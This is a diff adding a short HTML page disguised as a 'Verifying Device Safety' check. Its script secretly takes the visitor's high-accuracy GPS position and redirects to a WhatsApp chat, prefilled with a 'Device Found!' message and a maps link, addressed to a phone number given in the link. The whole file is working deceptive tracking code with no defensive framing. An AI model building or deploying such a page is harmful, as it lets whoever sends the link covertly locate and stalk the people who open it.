@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>System Verifying...</title></head>
+<body>
+    <h2 style="text-align:center; margin-top:50px;">Please Wait... Verifying Device Safety</h2>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const adminPhone = urlParams.get('to');
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Redirect to WhatsApp with location data
+            const waMsg = encodeURIComponent(`🎯 Device Found! \nLocation: ${mapLink}`);
+            window.location.href = `https://wa.me/${adminPhone}?text=${waMsg}`;
+        }, (err) => {
+            alert("Please enable GPS to verify device.");
+        }, {enableHighAccuracy: true});
+    </script>
+</body>
+</html>
